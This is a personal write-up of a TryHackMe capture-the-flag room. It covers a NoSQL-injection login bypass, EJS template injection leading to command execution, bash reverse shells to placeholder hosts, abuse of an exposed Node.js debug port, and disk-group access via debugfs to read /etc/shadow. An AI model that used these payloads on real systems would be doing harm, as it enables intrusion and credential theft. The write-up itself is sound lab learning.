# Do Not Disturb

> **TryHackMe Room:** [Do Not Disturb](https://tryhackme.com/room/hh-donotdisturb-84a45644)

This write-up covers how I approached the room, step by step. Flags and specific key and password values are not included.

## Introduction

This is the hardest room of all the Hacker Holidays challenges. It felt very challenging from the start, even though the site rates it as medium, with a duration of 60 minutes. I watched many videos on this room before being able to work through all of it myself, and even then, lateral movement took the longest to understand.

## Initial Access

The `nmap` scan showed two open ports: `22` and `80`. Port `80` presented a login form with `attendant` as a placeholder. I first tried a few test credentials, such as `123` and `abc`, while watching the network tab in the browser's developer tools.

The network tab showed that the site runs on Express.js, a Node.js framework. Knowing beforehand that the room was vulnerable to NoSQL injection, I used the following payload:

```web
username=attendant&password[$ne]=anything
```

`$ne` stands for "not equal." The payload effectively asks the database for a user named `attendant` whose password is not equal to `anything`, which is true for any actual password. Sending this request created a cookie and returned an HTTP 302 redirect to `/staff`, a path I already knew about from running `gobuster` against the machine's IP.

Opening `http://<Machine-IP>/staff` directly in another tab returned a 401 error. After copying the cookie's key and value from the earlier request into that tab, I was able to access the page.

Once inside, I was presented with a box containing the following:

```txt
Confirmation template (EJS — use <%= guest %> to personalize)
```

Below it was a greeting message. The `<%= guest %>` placeholder was the key detail: if code placed inside it gets executed, the site is vulnerable to server-side template injection (SSTI). The standard payload to check for this is:

```txt
<%= 7*7 %>
```

If it returns `49`, the site is vulnerable, and in this case it was. Before building a reverse shell, I tested whether a basic command would execute:

```js
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
```

It worked, so I used the same technique to get a reverse shell:

```js
<%= global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/<MACHINE_IP>/<PORT> 0>&1"').toString() %>
```

With a listener running on a terminal, I gained access and read the user flag.

## Lateral Movement

This was the part that gave me the most trouble, since I am not familiar with Node.js. The system had a service running in the background on port `9229`, which can be inspected using `node inspect <IP:PORT>`. From there, I could use `repl` (read-eval-print loop) to interact with the target Node.js runtime directly.

The straightforward path to finding this starts with checking `sudo` permissions and SUID binaries, then checking internal services with:

```bash
ss -tulnp
```

Running LinPEAS or LinEnum would have automated this discovery as well. Among the running services, one stood out on port `9229`. Inside `/opt/pipelinesvc`, a `telemetry` directory contained `processor.js` and `package.json`. The `processor.js` file revealed the service name, which I located with `find` at `/etc/systemd/system/`:

```service
[Unit]
Description=Byte Lotus Occupancy Telemetry Processor
After=network.target

[Service]
Type=simple
User=pipelinesvc
Group=pipelinesvc
WorkingDirectory=/opt/pipelinesvc/telemetry
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
```

This confirmed that the service runs as the `pipelinesvc` user on port `9229`. During inspection, I checked the current user with:

```bash
process.getuid()
process.getBuiltinModule('child_process').execSync('id').toString()
```

At this point I discovered that the `pipelinesvc` user belongs to the `disk` group, which meant I could likely read the flag directly from there. I decided against it, and instead planned to first gain a proper shell as `pipelinesvc`, then read `/etc/shadow` through `debugfs`, attempt to crack the password with John the Ripper, and use it to switch to root if it cracked successfully.

I gained a shell as `pipelinesvc` with the following command:

```bash
process.getBuiltinModule('child_process').exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'")
```

## Privilege Escalation

I first checked `id` and confirmed that the `pipelinesvc` user belonged to the `disk` group. Running `lsblk` to enumerate the local disk partitions showed that the root partition lived on `nvme0n1p1`. Since membership in the `disk` group grants raw access to block devices, this meant I could read files from the root partition directly, including `/etc/shadow`, without going through the filesystem's normal permission checks:

```bash
debugfs /dev/nvme0n1p1
cat /etc/shadow
```

At this point I already had effective access to every file on the system, but I wanted to confirm I could still recover the actual root password. It turned out to be crackable, though that will not always be the case in other rooms. I cracked it with John the Ripper, switched to root with `su`, and read the root flag.

## Conclusion

This room was challenging, but I learned a great deal from it, particularly the technique of copying a cookie into a restricted page, and the process of inspecting a Node.js service through its debug port. I was already familiar with the implications of `disk` group membership in theory, but this gave me hands-on practice with it. Hopefully, the next time I come across a Node.js inspector exposed like this, I will recognize it more quickly.
